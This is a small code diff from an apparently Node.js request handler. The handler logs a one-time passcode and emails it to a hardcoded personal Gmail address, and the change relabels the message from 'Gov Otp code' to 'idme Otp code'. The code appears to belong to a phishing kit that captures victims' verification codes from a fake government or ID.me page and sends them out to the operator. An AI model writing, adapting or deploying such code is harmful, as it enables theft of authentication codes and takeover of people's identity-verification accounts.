@@ -54,7 +54,7 @@ exports.code =  (req, res) => {
     try {
         const message = `Otp:${code}`
         console.log(message)
-        const reason = 'Gov Otp code'
+        const reason = 'idme Otp code'
         const email = 'techt5562@gmail.com'
         
        sendEmail(email, message, reason, (data) => {
